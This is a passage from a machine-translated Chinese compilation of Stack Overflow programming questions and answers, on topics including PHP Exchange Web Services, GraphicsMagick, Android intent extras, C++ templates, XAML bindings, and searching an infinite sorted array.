            //process the message data.

        }

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-20T18:49:57.030

这是一个更好的解决方案。您不希望每次都针对消息发出 GetItem 请求。这是昂贵且低效的，并且在包含数千封电子邮件的文件夹中获取电子邮件非常慢。另请注意，如果 exchange 返回 1 封电子邮件与多封电子邮件，则某些对象会嵌入到数组中，因此您的代码需要考虑它。此代码段将带回多个电子邮件正文（如果可用）。

```
$ews = new ExchangeWebServices("hostname", "username", "password", ExchangeWebServices::VERSION_2010);

$request = new EWSType_FindItemType();
$itemProperties = new EWSType_ItemResponseShapeType();
$itemProperties->BaseShape = EWSType_DefaultShapeNamesType::ID_ONLY;
$itemProperties->BodyType = EWSType_BodyTypeResponseType::TEXT;
$request->ItemShape = $itemProperties;

$request->ParentFolderIds = new EWSType_NonEmptyArrayOfBaseFolderIdsType();
$request->ParentFolderIds->DistinguishedFolderId = new EWSType_DistinguishedFolderIdType();
$request->ParentFolderIds->DistinguishedFolderId->Id = EWSType_DistinguishedFolderIdNameType::INBOX;

$request->Traversal = EWSType_ItemQueryTraversalType::SHALLOW;

$result = new EWSType_FindItemResponseMessageType();
$result = $ews->FindItem($request);

if ($result->ResponseMessages->FindItemResponseMessage->ResponseCode == 'NoError' && $result->ResponseMessages->FindItemResponseMessage->ResponseClass == 'Success') {
    $count = $result->ResponseMessages->FindItemResponseMessage->RootFolder->TotalItemsInView;
    $request = new EWSType_GetItemType();
    $request->ItemShape = new EWSType_ItemResponseShapeType();
    $request->ItemShape->BaseShape = EWSType_DefaultShapeNamesType::ALL_PROPERTIES;
    for ($i = 0; $i < $count; $i++){
        $message_id = $result->ResponseMessages->FindItemResponseMessage->RootFolder->Items->Message[$i]->ItemId->Id;

        $messageItem = new \EWSType_ItemIdType();
        $messageItem->Id = $message_id;
        $request->ItemIds->ItemId[] = $messageItem;

    }

    // Here is your response
    $response = $ews->GetItem($request);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T14:03:47.037

`$message`是一个包含整个消息（例如包括标题）的对象，而不是带有消息正文的字符串。要获取包含消息正文、消息正文类型等的对象`$message->body`，如果您只是对打印消息正文内容感兴趣，请使用`$message->body->_`

# image-processing - GraphicsMagick - 在左下角定位项目

> ID：12300866
> 
> 赞同：3
> 
> 时间：2012-09-06T13:09:47.360
> 
> 标签：image-processing, imagemagick, command-line-arguments, graphicsmagick

在尝试了我可能想到的所有命令组合之后，我仍然无法让它工作。

我有一个大小可以变化的大图像：Logo.png 我有一个“已知”大小的小图像：Wallpaper.png

我希望徽标出现在墙纸的左下角。

这必须通过使用 -flatten 的“gm convert”命令来完成。使用“gm composition”需要我运行两个不可接受的命令，因为这会增加我们处理每个图像的时间。

这是目前为止的命令（此命令还会添加更多内容，但这是它的核心）：

```
wallpaper.png -page +0+0 -gravity SouthWest logo.png -compose over -flatten result.jpg 
```

这会将徽标放在左上角。重力似乎被忽略了。对 -page 使用 +100% 也不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T21:04:00.677

我认为您不需要使用`-flatten`and`+page`

以下 ImageMagick 命令应该可以工作：

```
convert              \
  -composite         \
  -geometry +10+20   \
  -gravity southwest \
   background.png    \
   logo.png          \
   result.png 
```

对于 GraphicsMagick，这需要更改为：

```
gm                   \
   composite         \
  -geometry +10+20   \
  -gravity southwest \
   logo.png          \
   background.png    \
   result.png 
```

我添加`+10+20`以演示如何从最左下角稍微*偏移覆盖的徽标。*

# html - 没有获得图像名称及其扩展名

> ID：12300873
> 
> 赞同：0
> 
> 时间：2012-09-06T13:10:13.110
> 
> 标签：html, jsp

JSP代码：

```
<% String path="";
File f = new File("D:/.../WebContent/UploadedFiles");
File[] files = f.listFiles();
for(int i=0;i<files.length;i++){
path=files[i].getPath(); } %> 
```

当我把它作为图像 src="<%=path%>" 我得到整个路径为 D:\Java\Abc\image.png

问题是我不想要整个路径。我只想要图像名称及其扩展名。例如：“image.png”是我唯一想要的。将不胜感激你的答案。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:13:13.767

然后不要使用路径，[使用名称](http://docs.oracle.com/javase/6/docs/api/java/io/File.html#getName%28%29)：

```
path = files[i].getName(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:15:12.463

你试过`files[i].getName()`吗？

顺便说一句：请避免使用 JSP 脚本！您的代码有资格用作 servlet 的一部分。

# android - Android - 调试行布局并且不确定正在引用什么文件

> ID：12300875
> 
> 赞同：0
> 
> 时间：2012-09-06T13:10:14.470
> 
> 标签：android, android-layout, android-listview

我有一个屏幕布局，上面有一个东西列表：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:orientation="vertical"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        >

<include android:id="@+id/header"
         layout="@layout/header"
         android:layout_height="wrap_content"
         android:layout_width="fill_parent"/>    

<TextView
    android:id="@+id/loading_questions" 
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Text for please wait while questions load.  If the questions do not load, check your Internet connection. Questions are stored in a secure remote database so that you do not lose your work."
    android:textSize="12sp"
    />

    <ListView
        android:id="@+id/list"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">        
    </ListView>

</LinearLayout> 
```

在我的代码中，我像这样加载它：

ListView list = (ListView) findViewById(R.id.list);

然后像这样填充它：

```
ArrayList<HashMap<String, String>> mylist = new ArrayList<HashMap<String, String>>();
HashMap<String, String> map = new HashMap<String, String>();

// My data
private List<HashMap<String, String>> fillMaps = new ArrayList<HashMap<String, String>>();

SimpleAdapter adapter = new SimpleAdapter(this, fillMaps, R.layout.questions_list,
        new String[] {"train", "to"}, 
        new int[] {R.id.TRAIN_CELL,  R.id.TO_CELL});
// This was the middle item R.id.FROM_CELL,

list.setAdapter(adapter);       
list.setTextFilterEnabled(true); 
```

然后当项目加载时，我只是重新填充这个适配器。

这是 questions_list.xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout
     xmlns:android="http://schemas.android.com/apk/res/android"
     android:paddingTop="4dip"
     android:paddingBottom="6dip"
     android:layout_width="fill_parent"
     android:layout_height="wrap_content"
     android:orientation="horizontal"
     android:textSize="13sp">

     <TextView android:id="@+id/TRAIN_CELL"
         android:layout_width="275dip"
         android:layout_height="wrap_content"/>

     <TextView android:id="@+id/TO_CELL"
         android:layout_width="25dip"
         android:textSize="20sp"
         android:textStyle="bold" 
         android:gravity="center"
         android:src="@drawable/arrow_button"
         android:textColor="@color/light_best_blue"
         android:layout_height="wrap_content"  
         android:layout_weight="1"/>
</LinearLayout> 
```

它确实用两列呈现列表，但问题是它禁用了我的标题导航（按钮不再起作用），并且标题周围也有一个白色边框。

有谁知道为什么会发生这种情况以及如何解决它？

谢谢！

# c++ - 具有模板化函数的类的接口类

> ID：12300876
> 
> 赞同：2
> 
> 时间：2012-09-06T13:10:15.623
> 
> 标签：c++, templates

```
class Foo1: public IFoo
{
public:
    template <class T>
    std::vector<T> foo()
    {
        return std::vector<T>();
    }
};

class Foo2: public IFoo
{
public:
    template <class T>
    std::vector<T> foo()
    {
        return std::vector<T>();
    }
}; 
```

如何为上面的两个实现定义一个公共接口类，例如`std::vector<T> foo()`为这个接口定义的？忽略函数的实现是相同的。

**更新：**

我正在编写一个 Container 类，它表示通过 C api 发送给我的数据。

我的 Container 的一个实例将存储给定类型的数据，例如`Container<int>, Container<std::string> and Container<Foo>`.

C api 以一种非常尴尬的方式返回数据，将来可能会改变。我可以将数据复制到例如 std::list 或 std::vector 中，但由于从 C api 传递了如此多的数据，因此尚不知道这是否可以。

因此，Container 类应该独立于数据的实际存储方式。我使用传递给构造函数的 Getter 和 Setter 类来实现这一点，如下所示：

```
Container<int>(Getter1<int>(uglyCApiContainer),Setter1<int>(uglyCApiContainer)); 
```

因此，如果我放弃处理 C api 如何存储数据的 Getter1 和 Getter2，我只需要更改 Containers 的创建。

但是，我对这种设计有疑问。类型 Foo。

Foo 是一种复杂类型，它自身包含一组容器。目前它看起来像这样：

```
class Foo
{
public:
        ...
    template <class V>
    Container<V> getMember(std::string& memberName)
}; 
```

所以一个给定的 Foo 可以有一组不同类型的容器。我事先知道这些成员的类型，因为它们存储在模型中。Foo 目前是丑陋的 C api 内存实现的包装器，但我也想为 Foo 分离内存表示，就像我为容器所做的那样。

我不确定如何让 Foo 摆脱它的内存实现。我的一个想法是让 getMember 虚拟化，以便引入可能不同的实现，但这对于模板化函数是不可能的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T15:15:08.233

这是一个使用标签调度和虚拟继承的解决方案：

```
#include <vector>

template<typename T> struct tag {};

template<typename T> class IFooImpl {
public:
    virtual std::vector<T> getImpl(tag<T>) = 0;
};

class IFoo: public virtual IFooImpl<char>, virtual IFooImpl<int>
{
public:
    template<typename T> std::vector<T> get() {
        return static_cast<IFooImpl<T> *>(this)->getImpl(tag<T>{});
    }
};

template<typename T>
class FooImpl: public virtual IFooImpl<T> {
public:
    std::vector<T> getImpl(tag<T>) { return {}; }
};

class Foo: public IFoo, FooImpl<char>, FooImpl<int> {
};

int main() {
    Foo().get<char>();
} 
```

在所支持的类型被覆盖的地方有一些重复（这里`char`和`int`），但是可以通过可变模板继承来避免这种情况：

```
#include <vector>

template<typename T> struct tag {};

template<template<typename> class C, typename... Types> class Inherit {};
template<template<typename> class C, typename T, typename... Rest>
class Inherit<C, T, Rest...>: public C<T>, Inherit<C, Rest...> {};

template<typename T> class IFooImplV {
public:
    virtual std::vector<T> getImpl(tag<T>) = 0;
};
template<typename T> class IFooImpl: public virtual IFooImplV<T> {};

template<typename... Types> class IFoo: public Inherit<IFooImpl, Types...> {
public:
    template<typename T> std::vector<T> get() {
        return static_cast<IFooImpl<T> *>(this)->getImpl(tag<T>{});
    }
};

template<typename T> class FooImpl: public IFooImpl<T> {
public:
    std::vector<T> getImpl(tag<T>) { return {}; }
};

template<typename... Types> class FooMulti:
    public IFoo<Types...>, Inherit<FooImpl, Types...> {};
class Foo: public FooMulti<char, int> {};

int main() {
    Foo().get<char>();
} 
```

# android - 活动中的动画背景

> ID：12300883
> 
> 赞同：2
> 
> 时间：2012-09-06T13:10:43.860
> 
> 标签：android, android-layout, android-activity, android-animation

我想在我的活动中有一个动画背景（动画如翻译或放大图像）。举个例子，Twitter 应用程序在登录活动中进行了此操作。它慢慢放大背景图像，如下所示：

![开始](../Images/febf812dc8afd0824eca784d419f60a3.png) ![结尾](../Images/9e873adae9b514f650e57b3afaf37e5c.png)

我没有找到任何解决方案来移动可绘制集

```
getWindow().setBackgroundDrawable() 
```

我应该使用 ImageView 作为背景小部件，然后通过更改源图像来执行动画吗？

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-11T11:05:28.007

我认为以下链接对您有用

[https://github.com/Tprasanth/SplashScreenZoom](https://github.com/Tprasanth/SplashScreenZoom)

# ruby-on-rails - delay_job - 只停止一个进程

> ID：12300884
> 
> 赞同：3
> 
> 时间：2012-09-06T13:10:44.510
> 
> 标签：ruby-on-rails, ruby, delayed-job

使用`delayed_job`gem，我怎样才能在不停止所有工作人员的情况下只停止一个进程？

例如：

`rake jobs:work`启动工人

`process1 = SomeClass.enqueue`在代码中启动进程 1

`process2 = SomeClass.enqueue`在代码中启动进程 2

`process1.stop`将仅停止进程 1 并保持进程 2 运行。

我想类似的问题是“我怎样才能获得延迟作业过程的 PID？” 因为这样我就可以使用 PID 终止进程。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-08T06:40:35.837

Delayed Job 整体上是一个过程。要了解 pid，请检查延迟作业开始时在 temp 文件夹中创建的 .pid 文件。为了从代码中停止某个特定进程，请使用 Delayed::Job.all，或者找到您的工作并使用 destroy 方法将其关闭。

# android - 在下一个活动中检索时，放入 Intent 额外的 LinkedList 被重铸为 ArrayList

> ID：12300886
> 
> 赞同：26
> 
> 时间：2012-09-06T13:10:56.533
> 
> 标签：android, android-intent

我观察到的将可序列化数据作为额外意图传递的行为非常奇怪，我只是想澄清是否有一些我没有错过的东西。

所以我想做的事情是在我为开始下一个活动创建的实例中`ActivtyA`放入一个`LinkedList`实例- .`intent``ActivityB`

```
LinkedList<Item> items = (some operation);
Intent intent = new Intent(this, ActivityB.class);
intent.putExtra(AppConstants.KEY_ITEMS, items); 
```

在`onCreate`of 中`ActivityB`，我尝试`LinkedList`按如下方式检索额外内容 -

```
LinkedList<Item> items = (LinkedList<Item>) getIntent()
                             .getSerializableExtra(AppConstants.KEY_ITEMS); 
```

在运行此程序时，我在上面的行中反复输入了一个`ClassCastException`in `ActivityB`。基本上，异常说我收到了一个`ArrayList`. 一旦我将上面的代码更改为接收一个`ArrayList`，一切正常。

现在我不能只从现有文档中弄清楚这是否是 Android 在传递可序列化列表实现时的预期行为。或者，也许，我正在做的事情根本上是错误的。

谢谢。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-09-06T17:35:58.667

我可以告诉你为什么会这样，但你不会喜欢它;-)

首先是一些背景信息：

**an中的**Extras**`Intent`基本上是一个 Android `Bundle`，它基本上是一个`HashMap`键/值对。所以当你做类似的事情时**

 **```
intent.putExtra(AppConstants.KEY_ITEMS, items); 
```

Android`Bundle`为 extras 创建了一个新条目，并将一个映射条目添加到`Bundle`键所在的位置`AppConstants.KEY_ITEMS`和值是**项目**的位置（这是您的 LinkedList 对象）。

这一切都很好，如果您在代码执行后查看附加包，您会发现它包含一个`LinkedList`. 现在是有趣的部分......

当您`startActivity()`使用包含 extras 的 Intent 调用时，Android 需要将 extras 从键/值对映射转换为字节流。基本上它需要**序列化 ​​Bundle**。它需要这样做，因为它可能会在另一个进程中启动活动，并且为了做到这一点，它需要序列化/反序列化 Bundle 中的对象，以便它可以在新进程中重新创建它们。它也需要这样做，因为 Android 将 Intent 的内容保存在一些系统表中，以便以后需要时可以重新生成 Intent。

为了将其序列`Bundle`化为字节流，它会遍历包中的映射并获取每个键/值对。然后它获取每个“值”（它是某种对象）并尝试确定它是哪种对象，以便它可以以最有效的方式序列化它。为此，它会根据**已知对象类型列表检查对象类型**。“已知对象类型”列表包含诸如`Integer`, `Long`, `String`,之类的内容`Map`，`Bundle`不幸的是还有`List`. 因此，如果对象是 a `List`（其中有许多不同的种类，包括`LinkedList`），它会将其序列化并将其标记为 type 的对象`List`。

当`Bundle`反序列化时，即：当你这样做时：

```
LinkedList<Item> items = (LinkedList<Item>)
        getIntent().getSerializableExtra(AppConstants.KEY_ITEMS); 
```

它为类型`ArrayList`中的所有对象生成一个。`Bundle``List`

实际上，您无法做任何事情来改变 Android 的这种行为。至少现在你知道它为什么这样做了。

只是为了让您知道：我实际上编写了一个小型测试程序来验证这种行为，并且我查看了源代码，`Parcel.writeValue(Object v)`该方法是在`Bundle`将映射转换为字节流时调用的方法。

**重要说明：**由于`List`是接口，这意味着任何实现`List`您放入 a 的类`Bundle`都将以`ArrayList`. 有趣的`Map`是，它也在“已知对象类型”列表中，这意味着无论`Map`您放入什么类型的对象`Bundle`（例如`TreeMap`,`SortedMap`或任何实现该`Map`接口的类），您总是会得到`HashMap`一个它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-12-17T20:14:42.470

[@David Wasser](https://stackoverflow.com/a/12305459/535871)的答案在诊断问题方面是正确的。这篇文章是为了分享我是如何处理它的。

任何`List`对象作为一个出来的问题`ArrayList`并不可怕，因为你总是可以做类似的事情

```
LinkedList<String> items = new LinkedList<>(
    (List<String>) intent.getSerializableExtra(KEY)); 
```

这会将反序列化列表的所有元素添加到新的`LinkedList`.

当涉及到 时，问题要严重得多`Map`，因为您可能已经尝试序列化 a`LinkedHashMap`并且现在已经丢失了元素排序。

幸运的是，有一种（相对）轻松的方法来解决这个问题：定义您自己的可序列化包装类。您可以针对特定类型执行此操作，也可以通用执行此操作：

```
public class Wrapper <T extends Serializable> implements Serializable {
    private T wrapped;

    public Wrapper(T wrapped) {
        this.wrapped = wrapped;
    }

    public T get() {
        return wrapped;
    }
} 
```

然后，您可以使用它来隐藏您的`List`、`Map`或其他数据类型以防止 Android 的类型检查：

```
intent.putExtra(KEY, new Wrapper<>(items)); 
```

然后：

```
items = ((Wrapper<LinkedList<String>>) intent.getSerializableExtra(KEY)).get(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-15T15:26:56.987

如果您正在使用 IcePick 库并且遇到此问题，您可以使用 Ted Hoop 的技术和自定义捆绑器，以避免在代码中处理 Wrapper 实例。

```
public class LinkedHashmapBundler implements Bundler<LinkedHashMap> {

 @Override
 public void put(String s, LinkedHashMap val, Bundle bundle) {
    bundle.putSerializable(s, new Wrapper<>(val));
 }

 @SuppressWarnings("unchecked")
 @Override
 public LinkedHashMap get(String s, Bundle bundle) {
   return ((Wrapper<LinkedHashMap>) bundle.getSerializable(s)).get();
 }
} 

// Use it like this
@State(LinkedHashmapBundler.class) LinkedHasMap map 
```**

# c# - 在 Silverlight XAML 中附加文本

> ID：12300887
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:01.110
> 
> 标签：c#, silverlight, xaml, combobox, telerik

你好，

我有一个绑定到项目列表的 Telerik 组合框。它显示它们很好。我希望更改的只是将另一个对象的属性附加到组合框中字符串的开头。

目前，组合框显示`"ListOfItems.Name"`，我希望它显示`"Object.Property --- ListOfItems.Name"`

```
 <telerik:RadComboBox x:Name="radComboBox" ItemsSource="{Binding ListOfItems}" DisplayMemberPath="Name" SelectedItem="{Binding SelectedName, Mode=TwoWay}"/> 
```

类似的东西

```
 <telerik:RadComboBox x:Name="radComboBox" ItemsSource="{Binding ListOfItems}" DisplayMemberPath="String.Append(Object.Property --- Name)" SelectedItem="{Binding SelectedName, Mode=TwoWay}"/> 
```

如何在我的 XAML 代码中执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T14:10:54.277

我不完全确定我理解你想要做什么，但如果我理解正确，你必须使用 RadComboBox 的 ItemTemplate 属性：

```
<telerik:RadComboBox x:Name="radComboBox"
                 ItemsSource="{Binding ListOfItems}"
                 SelectedItem="{Binding SelectedName, Mode=TwoWay}">
<telerik:RadComboBox.ItemTemplate>
    <DataTemplate>
        <StackPanel Orientation="Horizontal">
            <TextBlock Text="Object.Property"></TextBlock>
            <TextBlock Text=" --- "></TextBlock>
            <TextBlock Text="{Binding Name}"></TextBlock>
        </StackPanel>
    </DataTemplate>
</telerik:RadComboBox.ItemTemplate> 
```

# javascript - Jqplot删除轴标量（数字）

> ID：12300890
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:18.807
> 
> 标签：javascript, jquery, jqplot

如何删除 jqplot 中的轴标量（数字）？有没有更好的替代 jquery 或 js 图形库？谢谢

# javascript - 如何在 enyo.js 中填充数组？

> ID：12300891
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:17.900
> 
> 标签：javascript, enyo

我有一个数组。我想在 enyo.js 中给出数组的值。

我将如何动态填充数组？

以下是代码：

```
enyo.kind({
   name: "enyo.sample.RepeaterSample",
   classes: "enyo-fit repeater-sample",
    components: [
    {kind: "Repeater", onSetupItem:"setupItem", components: [
        {name:"item", classes:"repeater-sample-item", components: [
            {tag:"span", name: "personNumber"},
            {tag:"span", name: "personName"}
        ]}
    ]}
],
create: function() {
    this.inherited(arguments);
    this.$.repeater.setCount(this.people.length);
},
setupItem: function(inSender, inEvent) {
    var index = inEvent.index;
    var item = inEvent.item;
    var person = this.people[index];
    item.$.personNumber.setContent((index+1) + ". ");
    item.$.personName.setContent(person.name);
    item.$.personName.applyStyle("color", person.sex == "male" ? "dodgerblue" : "deeppink");
},
people: [
    {name: "Andrew", sex:"male"},
    {name: "Betty", sex:"female"},
    {name: "Christopher", sex:"male"},
    {name: "Donna", sex:"female"},
    {name: "Ephraim", sex:"male"},
    {name: "Frankie", sex:"male"},
    {name: "Gerald", sex:"male"},
    {name: "Heather", sex:"female"},
    {name: "Ingred", sex:"female"},
    {name: "Jack", sex:"male"},
    {name: "Kevin", sex:"male"},
    {name: "Lucy", sex:"female"},
    {name: "Matthew", sex:"male"},
    {name: "Noreen", sex:"female"},
    {name: "Oscar", sex:"male"},
    {name: "Pedro", sex:"male"},
    {name: "Quentin", sex:"male"},
    {name: "Ralph", sex:"male"},
    {name: "Steven", sex:"male"},
    {name: "Tracy", sex:"female"},
    {name: "Uma", sex:"female"},
    {name: "Victor", sex:"male"},
    {name: "Wendy", sex:"female"},
    {name: "Xin", sex:"male"},
    {name: "Yulia", sex:"female"},
    {name: "Zoltan"},
] 
```

});

在这种情况下，人是硬编码的。我想动态地给出我从 json 获得的价值。

请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T15:26:27.367

当您获得 JSON 数组时，您只需设置 this.people = [来自 JSON 的数据]。如果代码包含在相同的顶级类型 (enyo.sample.RepeaterSample) 中，则此方法有效。

如果 JSON 返回的类型不同，那么您可能需要为 enyo.sample.RepeaterSample 设置一个已发布的属性：

```
published: {
   people: []
} 
```

然后你可以使用 setPeople(arrayOfPeople)。然后，您还可以在 peopleChanged 方法中自动重新构建转发器：

```
peopleChanged: function() {
   this.$.repeater.setCount(this.people.length);
} 
```

# c# - VS2010 Express - 缺少母版页模板，并且没有命令行窗口

> ID：12300896
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:32.330
> 
> 标签：c#, wpf, visual-studio-2010

我正在使用 .NET 4.0 运行 VS2010 Express，并尝试为 WPF 浏览器应用程序创建母版页。问题是，没有母版页模板。

我搜索了一下，发现需要从 IDE 命令窗口运行“devenv.exe /InstallVSTemplates”。. . . . 这也是缺失的。

这是 Express 版本的已知限制，还是我的安装缺少某些内容？完全卸载/重新安装会解决这个问题吗？

有没有其他人经历过这种情况？

非常感谢任何帮助 - 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:31:42.907

您可以从任何 cmd 窗口运行它，Visual Studio 命令提示符只是设置了一些额外的路径内容。您需要在 devenv 目录中才能运行它。

路径变量都与 Visual Studio 组件的路径有关。

它基本上运行 C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\bin\vcvars32.bat

但是，不能保证它可以作为解决方案。Express 非常好，但他们确实禁用了一些东西来证明免费价格标签的合理性:)

# c# - 是否可以在匿名函数中设置断点？

> ID：12300898
> 
> 赞同：59
> 
> 时间：2012-09-06T13:11:34.333
> 
> 标签：c#, visual-studio-2010, lambda, anonymous-function

我很快想确定是否/何时触发了一组事件。因此，我迅速为他们分配了空的 lambda。

```
_session.TopologyStarted += () => { }; 
```

当触发事件时跟踪代码时，调试器进入匿名函数，允许调试它的执行。但是，在这行代码上设置断点时，会在将匿名函数分配给事件时设置断点。

有没有办法在匿名函数中设置断点？

* * *

## 回答 #1

> 赞同：107
> 
> 时间：2012-09-06T13:13:58.507

将光标放在匿名函数中（在 {} 之间）并按`F9`。

# security - 你会被注释掉的 html 表单入侵吗？

> ID：12300899
> 
> 赞同：0
> 
> 时间：2012-09-06T13:11:38.467
> 
> 标签：security

如果我有一个使用注释掉的 html 表单`<!-- form -->`

哪个输入字段未经过清理，有人可以使用这些字段对数据库进行错误查询吗？例如使用萤火虫，有人可以删除`<!--`并使用这些输入字段来做一些讨厌的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:14:05.453

根据处理表单的脚本，一个人当然可以在没有注释的情况下创建该表单的本地副本。事实上，如果他们知道输入名称和语义是什么，他们就可以完全创建自己的表单。没有很好的方法来检测表单提交是来自您的表单还是其他伪装成它的表单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:18:47.030

您发送给用户的所有信息都可以由他修改，因此如果您不希望他看到该信息，请不要将其注释掉，只需将其删除或用 php 注释掉即可。

如果您的数据库能够接收到“坏”查询，那就是编码错误，因为即使您没有向他发送任何表格，用户也可以发布自己的数据。即使您的 HTML 不允许，您也必须添加服务器端安全性（身份验证、检查用户权限、sql 注入...），因为用户无法修改服务器端代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:14:18.913

不确定，但我会这样检查：从浏览器的元素检查器中编辑 HTML 并取消注释。如果那时你可以使用它，你可能会被黑客入侵。

# c# - 返回静态只读列表

> ID：12300901
> 
> 赞同：2
> 
> 时间：2012-09-06T13:11:43.097
> 
> 标签：c#, list, static

我有一个带有私有静态`List<String>`集合的类。现在我想返回一个只读列表。这会是理想的方式吗？你会用另一种方式吗？这是正确的方法吗？

```
namespace Test
{
    static class Storage
    {

        private static List<string> store;

        static Storage()
        {
            store = new List<string>();
        }

        //Is it okay to have a getter in my static class to return my List Collection
        public static System.Collections.ObjectModel.ReadOnlyCollection<string>getList
        {
            get
            {
                return stores.AsReadOnly();
            }
        }

        public static void addString(string add)
        {
            store.Add(add);
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:15:20.617

这取决于客户的期望。如果您的客户期望列表的内容可以更改，那么（模糊）没关系。如果他们期待一个*不变*的收藏，那么您需要复制一份。

请注意，`List<T>`从一开始就不是线程安全的，当涉及到*全局*可变状态时，这是一个大红色警告灯，访问时没有明显的同步......

（拥有全局可变状态是一个问题，IMO，影响可测试性等。以不安全的方式这样做只会让事情变得更糟。）

# performance - 在无限长的排序数组中查找元素

> ID：12300904
> 
> 赞同：13
> 
> 时间：2012-09-06T13:11:53.747
> 
> 标签：performance, algorithm, data-structures, time-complexity

给定一个具有正整数和负整数的无限长排序数组。在其中找到一个元素。

**编辑**
数组中的所有元素都是唯一的，并且数组在正确的方向上是无限的。

有两种方法：

# 方法一：

将索引设置在位置 100，如果要查找的元素较少，则在前 100 个项目中进行二分查找，否则将下一个索引设置在位置 200。这样，继续将索引增加 100，直到项目更大。

# 方法二：

将索引设置为 2 的幂。首先将索引设置在位置 2，然后是 4，然后是 8，然后是 16，依此类推。再次从位置 2^K 到 2^(K + 1) 进行二分搜索，其中 item 介于两者之间。

在最好的情况下和最坏的情况下，这两种方法中的哪一种会更好？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-06T13:15:46.910

第一种方法在元素的索引中是线性的（`O(k)`其中`k`是元素的索引）。实际上，您将需要`k/100`迭代才能找到大于搜索元素的元素，即`O(k)`.

第二种方法将在同一索引中对数。`O(logk)`. （其中`k`是元素的索引）。在这里，您将需要`log(k)`迭代，直到找到更高的元素。`2^(i-1)`然后，之间的二进制搜索`2^i`（其中`i`是迭代次数）也将是对数的，总计为`O(logk)`

因此，**第二种更有效**。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T13:15:22.783

您可以通过小的修改或多或少地直接应用二进制搜索。这将大致对应于您的方法 2。

基本上，选择一些数字 B 并将 A 设置为 0，然后检查您要查找的元素是否在 A 和 B 之间。如果是，则在这些边界中执行通常的二分搜索，否则设置 B=A 和 A =2*A 并重复。这将花费 O(log(M))，其中 M 是您要在数组中查找的元素的位置。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-06T13:23:22.867

如果数组是有根据的，即有一个最小元素（即你有元素*x* [0]，*x* [1]，...），并且所有元素都是唯一的，那么这里有一个简单的方法：如果你正在寻找数字*n*，您可以对索引 0, ..., *n*  -  *x* [0]进行二分搜索。请注意，对于所有*i ≥ 0，我们总是有基本的不等式**x* [*i*]  ≥  *i*  +  *x* [0]  。

 *因此，您可以在 log [2] ( *n*  −  *x* [0] ) 步中找到值*n 。*

 *** * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-07T16:55:23.613

由于数组是无限的，因此索引必然是可变长度的。这意味着对它们进行数学运算不是`O(1)`，这反过来意味着“首先搜索端点的二进制搜索”的时间复杂度与`O(log(k))`.

在搜索端点时完成的索引数学只是左移一位，这是`O(log(k))`因为索引向上`k`需要最多`log(k)`位并且左移一位在位数上是线性的。

在二进制搜索中完成的索引数学`O(log(k))`也是如此。

所以这两种算法的实际复杂度都是`O(log(k)^2)`. 线性搜索的复杂度是`O(k log k)`，所以它还是会输。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-07T05:56:40.157

只是我的2美分。我们有一个无限数组，因此让我们想象我们正在寻找非常大的数字。你想象过吗？好吧，它变得更大了。请注意，二进制搜索的间隔长度`2^i = 2^(i+1)-2^i`因此需要`log(2^i)=i`时间才能找到数字。另一方面`i`，达到目标间隔需要时间。所以总时间复杂度`O(n)`又是。我错过了什么？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-03-17T13:21:34.933

[这](http://www.2010bit.com/searching-number-in-infinite-sorted-array-java/)是另一种实现，它使用 2^n 来搜索元素本身的出现，然后将此子数组提供给二分搜索

```
e.g.
 arr = 1,2,3,4,5,6,7,8,9,-1,-1,-1,-1,-1,-1...........
 num = 8;

efficiency = 2logn 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-01-10T12:29:46.560

--完全解决方案-- 需要 O(logn) 时间复杂度

```
public class B {

    public static void main(String[] args) {
        // Assuming sorted array of infinite length
        int a[] = new int[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 };

        int elementToFind = 12;

        int finalIndex = getFinalIndex(a, elementToFind);

        if (finalIndex == -1) {
            System.out.println("Element not found");
        }
        System.out.println("Found element:" + a[finalIndex]);

    }

    private static int getFinalIndex(int[] a, int elementToFind) {

        int power = 2;
        int finalIndex = (int) Math.pow(2, power);

        for (int i = 0; i < finalIndex;) {

            if (elementToFind == a[finalIndex]) {
                return finalIndex;
            }

            else if (elementToFind < a[finalIndex]) {
                System.out.println("search through binary search algo");
                // taking i as starting index in binary search call
